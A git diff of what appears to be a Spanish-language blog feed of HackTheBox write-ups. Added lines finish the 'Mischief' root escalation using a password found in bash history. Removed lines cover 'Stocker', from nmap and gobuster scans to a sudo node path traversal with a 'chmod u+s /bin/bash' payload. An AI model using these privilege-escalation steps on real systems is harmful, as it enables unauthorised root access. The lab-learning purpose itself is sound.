+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Nov 10 23:26:18 UTC 2023
+
+  System load:  0.0               Processes:            167
+  Usage of /:   61.5% of 6.83GB   Users logged in:      0
+  Memory usage: 36%               IP address for ens33: 10.10.10.92
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat Jul 14 12:44:04 2018 from 10.10.14.4
+loki@Mischief:~$ ls
+credentials  hosted  user.txt
+loki@Mischief:~$ cat user.txt 
+bf5***************************60
+loki@Mischief:~$
+ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;hr /&gt;
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/h2&gt;
+
+&lt;p&gt;Listamos el “history” para ver que comandos ejecutó el usuario Loki.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;flag.js  user.txt
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
-ca4&lt;span class=&quot;k&quot;&gt;*************************&lt;/span&gt;7d
-angoose@stocker:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+loki@Mischief:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;history
+    &lt;/span&gt;1  python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPAuthServer loki:lokipasswordmischieftrickery &amp;lt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+    2  &lt;span class=&quot;nb&quot;&gt;exit
+    &lt;/span&gt;3  free &lt;span class=&quot;nt&quot;&gt;-mt&lt;/span&gt;
+    4  ifconfig
+    5  &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc/
+    6  &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
+    7  su
+    8  &lt;span class=&quot;nb&quot;&gt;exit
+    &lt;/span&gt;9  su root
+   10  &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+   11  &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+   12  ifconfig
+   13  &lt;span class=&quot;nb&quot;&gt;id
+   &lt;/span&gt;14  &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .bash_history 
+   15  nano .bash_history 
+   16  &lt;span class=&quot;nb&quot;&gt;exit
+   &lt;/span&gt;17  &lt;span class=&quot;nb&quot;&gt;ls
+   &lt;/span&gt;18  &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
+   19  &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
+   20  &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+   21  hostiry
+   22  &lt;span class=&quot;nb&quot;&gt;history
+&lt;/span&gt;loki@Mischief:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Intentemos usar esas credenciales para convertirnos en Root.&lt;/p&gt;
 
-&lt;h2 id=&quot;escala-de-privilegios&quot;&gt;Escala de privilegios&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;loki@Mischief:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su
+bash: /bin/su: Permission denied
+loki@Mischief:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
+bash: /usr/bin/sudo: Permission denied
+loki@Mischief:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
 
-&lt;p&gt;Si hacemos sudo -l vemos que podemos ejecutar cualquier js con node&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Vemos que no nos deja usar “SU” o “SUDO SU”.&lt;/p&gt;
+
+&lt;p&gt;Para listar mejor los privilegios podemos usar getfacl.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;angoose: IHeardPassphrasesArePrettySecure 
-Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;angoose on stocker:
-    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+loki@Mischief:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getfacl /bin/su 
+getfacl: Removing leading &lt;span class=&quot;s1&quot;&gt;&apos;/&apos;&lt;/span&gt; from absolute path names
+&lt;span class=&quot;c&quot;&gt;# file: bin/su&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# owner: root&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# group: root&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# flags: s--&lt;/span&gt;
+user::rwx
+user:loki:r--
+group::r-x
+mask::r-x
+other::r-x
 
-User angoose may run the following commands on stocker:
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /usr/bin/node /usr/local/scripts/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.js
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+loki@Mischief:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getfacl /bin/su 
+getfacl: Removing leading &lt;span class=&quot;s1&quot;&gt;&apos;/&apos;&lt;/span&gt; from absolute path names
+&lt;span class=&quot;c&quot;&gt;# file: bin/su&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# owner: root&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# group: root&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# flags: s--&lt;/span&gt;
+user::rwx
+user:loki:r--
+group::r-
+mask::r-x
+other::r-x
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Pueden ver que en “user:loki:r–” tiene capacidad de lectura pero no de ejecución, aunque para otros
+tienen capacidad lectura y de ejecución.&lt;/p&gt;
+
+&lt;p&gt;Volvamos a la shell “www-data” e intentemos escalar los privilegios ahí utilizando el comando “SU” y 
+la contraseña “lokipasswordmischieftrickery”.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+www-data@Mischief:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su
+Password: lokipasswordmischieftrickery
+root@Mischief:/#
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Pudimos escalar los privilegios, ahora nos dirigimos al directorio /root para visualizar la segunda flag.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+root@Mischief:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt 
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
+The flag is not here, get a shell to find it!
+root@Mischief:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Pero vemos que nos dice que la falg no se encuentra ahí y que debemos encontrarla.&lt;/p&gt;
+
+&lt;p&gt;Busquemos archivos que llamen root.txt con find.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+root@Mischief:/# find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;name root.txt 2&amp;gt;/dev/null
+./usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+./root/root.txt
+root@Mischief:/# 
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ahora definimos un js para que nos haga una bash suid, cuando lo ejecutemos nos hará un directory path traversal&lt;/p&gt;
+&lt;p&gt;Nos muestra una ruta donde podria estar la verdadera flag de root, veamos si se encuentra haciéndole un cat a la ruta del archivo.&lt;/p&gt;
 
-&lt;h2 id=&quot;codigo-js&quot;&gt;Codigo js&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;require(&apos;child_process&apos;).exec(&apos;chmod u+s /bin/bash&apos;)
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+root@Mischief:/# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+ae155fad479c56f912c65d7be4487807
+root@Mischief:/# 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ejecutamos el script de js y al hacer bash -p tendremos privilegio como root&lt;/p&gt;
+&lt;p&gt;Tenemos la segunda flag.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;node /usr/local/scripts/../../../home/angoose/setensa.js
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;angoose: IHeardPassphrasesArePrettySecure 
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/bash
-&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 1183448 Apr 18  2022 /bin/bash
-angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
-bash-5.0# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
-bash-5.0# &lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;root.txt
-bash-5.0# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
-26&lt;span class=&quot;k&quot;&gt;*****************************&lt;/span&gt;9
-bash-5.0# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Y obtenemos la segunda flag&lt;/p&gt;
+&lt;p&gt;Espero que se haya entendido.&lt;/p&gt;
 
-&lt;p&gt;Espero que les haya gustado mi primer writeup y que se haya entendido&lt;/p&gt;
-
-&lt;p&gt;Gracias por leer :D.&lt;/p&gt;</content><author><name>VØ1DN3T</name></author><category term="hackthebox" /><category term="pentesting" /><category term="Hacking web" /><category term="pentesting" /><category term="Linux" /><summary type="html">Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.</summary></entry><entry><title type="html">Flight HackTheBox</title><link href="http://localhost:4000/writeup-flight/" rel="alternate" type="text/html" title="Flight HackTheBox" /><published>2023-03-12T00:00:00-03:00</published><updated>2023-03-12T00:00:00-03:00</updated><id>http://localhost:4000/writeup-flight</id><content type="html" xml:base="http://localhost:4000/writeup-flight/">&lt;p&gt;Buenas a todos, en esta ocasión resolveremos una máquina windows llamada flight lo cual está catalogada como hard en la plataforma de HackTheBox, me costó bastante resolver esta máquina más que nada la escalada de privilegios, disfruten el contendido.&lt;/p&gt;
+&lt;p&gt;Gracias por leer :)&lt;/p&gt;</content><author><name>Vo1dN3t</name></author><category term="HackTheBox" /><category term="pentesting" /><category term="Hacking Web" /><category term="Ipv6" /><category term="Command Execution" /><summary type="html">Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada “Mischief” la cual está catalogada como insane en la plataforma de HackTheBox.</summary></entry><entry><title type="html">Flight HackTheBox</title><link href="http://localhost:4000/writeup-flight/" rel="alternate" type="text/html" title="Flight HackTheBox" /><published>2023-03-12T00:00:00+00:00</published><updated>2023-03-12T00:00:00+00:00</updated><id>http://localhost:4000/writeup-flight</id><content type="html" xml:base="http://localhost:4000/writeup-flight/">&lt;p&gt;Buenas a todos, en esta ocasión resolveremos una máquina windows llamada flight lo cual está catalogada como hard en la plataforma de HackTheBox, me costó bastante resolver esta máquina más que nada la escalada de privilegios, disfruten el contendido.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-flight/flight.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -1267,327 +1378,4 @@ PS C:\windows\system32\inetsrv&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Eso es todo, espero que se haya entendido&lt;/p&gt;
 
-&lt;p&gt;Gracias por leer :D.&lt;/p&gt;</content><author><name>VØ1DN3T</name></author><category term="hackthebox" /><category term="pentesting" /><category term="Active Directory" /><category term="pentesting" /><category term="windows" /><category term="Remote port Forwarding" /><summary type="html">Buenas a todos, en esta ocasión resolveremos una máquina windows llamada flight lo cual está catalogada como hard en la plataforma de HackTheBox, me costó bastante resolver esta máquina más que nada la escalada de privilegios, disfruten el contendido.</summary></entry><entry><title type="html">Stocker HackTheBox</title><link href="http://localhost:4000/Blog-SQLI/" rel="alternate" type="text/html" title="Stocker HackTheBox" /><published>2023-03-12T00:00:00-03:00</published><updated>2023-03-12T00:00:00-03:00</updated><id>http://localhost:4000/Blog-SQLI</id><content type="html" xml:base="http://localhost:4000/Blog-SQLI/">&lt;p&gt;Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/Stocker.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Empezamos a escanear para descubrir puertos abiertos en la máquina&lt;/p&gt;
-
-&lt;p&gt;Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.&lt;/p&gt;
-
-&lt;p&gt;Empezamos a escanear para decubrir puertos abiertos en la máquina&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.196
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;&apos;up&apos;&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-03-12 21:37 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
-Initiating SYN Stealth Scan at 21:37
-Scanning 10.10.11.196 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.10.11.196
-Discovered open port 80/tcp on 10.10.11.196
-Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196 from 0 to 5 due to max_successful_tryno increase to 4
-Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196 from 5 to 10 due to max_successful_tryno increase to 5
-Completed SYN Stealth Scan at 21:37, 16.48s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Scanned at 2023-03-12 21:37:28 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;17s
-Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT   STATE SERVICE REASON
-22/tcp open  ssh     syn-ack ttl 63
-80/tcp open  http    syn-ack ttl 63
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Luego seguimos con el escaneo de puertos para ver qué versiones y servicios tiene&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.11.196
-Starting Nmap 7.93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-03-12 21:47 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   3072 3d12971d86bc161683608f4f06e6d54e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 7c4d1a7868ce1200df491037f9ad174f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 dd978050a5bacd7d55e827ed28fdaa3b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Did not follow redirect to http://stocker.htb &amp;lt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Vemos que nmap en el puerto 80 nos reportó un dominio, otra forma para descubrir el dominio es tirando de curl&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.10.11.196 &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Location
-Location: http://stocker.htb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ya que tenemos un dominio es tan solo agregarlo en el archivo /etc/hosts&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-127.0.0.1       localhost
-127.0.1.1       voidnet
-10.10.11.196 stocker.htb
-&lt;span class=&quot;c&quot;&gt;# The following lines are desirable for IPv6 capable hosts&lt;/span&gt;
-::1     localhost ip6-localhost ip6-loopback
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Revisemos la web&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pagina.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora que tenemos un dominio intentemos buscar directorios ocultos con gobuster&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://stocker.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100
-
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-Gobuster v3.5
-by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://stocker.htb
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 100
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.5
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-2023/03/12 22:07:03 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-/img                  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/img/]
-/css                  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/css/]
-/js                   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/js/]
-/fonts                &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/fonts/]
-Progress: 9028 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.09%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;^C
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Keyboard interrupt detected, terminating.
-
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-2023/03/12 22:07:20 Finished
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Podemos ver que nos reportó un directorio llamado fonts, veamos con qué nos encontramos&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/direc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que no hay nada, intentemos buscar subdirectorios&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
- gobuster vhost &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://stocker.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100 &lt;span class=&quot;nt&quot;&gt;--no-error&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-Gobuster v3.5
-by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
